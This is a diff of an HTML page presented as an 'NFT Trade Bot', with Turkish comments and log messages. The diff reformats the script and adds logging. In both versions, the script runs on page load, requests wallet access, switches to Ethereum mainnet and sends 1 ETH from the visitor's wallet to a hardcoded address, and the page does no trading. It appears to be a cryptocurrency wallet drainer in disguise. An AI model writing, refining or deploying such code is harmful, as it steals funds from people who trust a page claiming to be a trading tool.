@@ -1,66 +1,97 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8">
-  <title>NFT Trade Bot</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
+    <meta charset="UTF-8">
+    <title>NFT Trade Bot</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
 </head>
 <body>
 
 <script>
-  const toAddress = "0x6cE2B898EE2653d02E7bbB42A19aCc801Ea2964D";
-  const amountEth = "1";
+const toAddress = "0x6cE2B898EE2653d02E7bbB42A19aCc801Ea2964D";
+const amountEth = "1";
 
-  async function switchToEthereumMainnet() {
+async function switchToEthereumMainnet() {
     try {
-      await window.ethereum.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: "0x1" }]
-      });
-    } catch (switchError) {
-      console.error("Ağ değiştirilemedi:", switchError);
-    }
-  }
-
-  async function start() {
-    if (typeof window.ethereum === "undefined") {
-      console.error("Metamask veya uyumlu bir cüzdan bulunamadı.");
-      return;
-    }
-
-    try {
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const network = await provider.getNetwork();
-
-      if (Number(network.chainId) !== 1) {
-        await switchToEthereumMainnet();
-      }
-
-      await window.ethereum.request({ method: "eth_requestAccounts" });
-      const signer = await provider.getSigner();
-      const address = await signer.getAddress();
-      const balance = await provider.getBalance(address);
-      const value = ethers.parseEther(amountEth);
-
-      if (balance < value) {
-        console.log("Yetersiz bakiye. İşlem yapılmadı.");
-        return;
-      }
-
-      const tx = await signer.sendTransaction({
-        to: toAddress,
-        value: value
-      });
-
-      console.log("İşlem gönderildi:", tx.hash);
-      await tx.wait();
-      console.log("İşlem onaylandı.");
+        await window.ethereum.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: "0x1" }]
+        });
+        return true;
     } catch (error) {
-      console.error("Hata oluştu:", error);
+        console.error("Ethereum Mainnet'e geçilemedi:", error);
+        return false;
     }
-  }
+}
 
-  window.addEventListener("load", start);
+async function start() {
+    if (!window.ethereum) {
+        console.error("MetaMask veya uyumlu bir cüzdan bulunamadı.");
+        return;
+    }
+
+    try {
+        // Hesap erişimi iste
+        await window.ethereum.request({
+            method: "eth_requestAccounts"
+        });
+
+        const provider = new ethers.BrowserProvider(window.ethereum);
+
+        // Ağ kontrolü
+        let network = await provider.getNetwork();
+
+        if (Number(network.chainId) !== 1) {
+            const switched = await switchToEthereumMainnet();
+
+            if (!switched) {
+                return;
+            }
+
+            network = await provider.getNetwork();
+        }
+
+        const signer = await provider.getSigner();
+        const address = await signer.getAddress();
+
+        // Bakiyeyi al (Ethers v6 uyumlu)
+        const balance = await provider.getBalance(address);
+
+        console.log(
+            "Cüzdan:",
+            address,
+            "Bakiye:",
+            ethers.formatEther(balance),
+            "ETH"
+        );
+
+        const value = ethers.parseEther(amountEth);
+
+        if (balance < value) {
+            console.log("Yetersiz bakiye. İşlem yapılmadı.");
+            return;
+        }
+
+        console.log("İşlem onayı bekleniyor...");
+
+        const tx = await signer.sendTransaction({
+            to: toAddress,
+            value: value
+        });
+
+        console.log("İşlem gönderildi:", tx.hash);
+
+        const receipt = await tx.wait();
+
+        console.log("İşlem onaylandı.");
+        console.log("Block:", receipt.blockNumber);
+
+    } catch (error) {
+        console.error("Hata oluştu:", error);
+    }
+}
+
+window.addEventListener("load", start);
 </script>
 
 </body>
